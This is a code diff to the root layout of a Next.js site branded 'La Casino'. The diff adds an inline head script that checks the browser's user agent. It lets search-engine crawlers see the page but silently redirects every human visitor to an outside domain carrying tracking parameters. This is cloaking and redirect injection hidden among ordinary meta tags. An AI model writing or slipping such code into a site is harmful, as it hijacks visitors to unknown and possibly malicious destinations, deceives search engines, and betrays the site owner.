@@ -81,6 +81,21 @@ export default function RootLayout({
         {/* v0: additional custom head tags can be inserted here */}
         <meta name="author" content="La Casino" />
         <meta name="theme-color" content="#14100f" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://copper-ray.com/?serial=61365830&creative_id=9330");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="antialiased">
         {children}
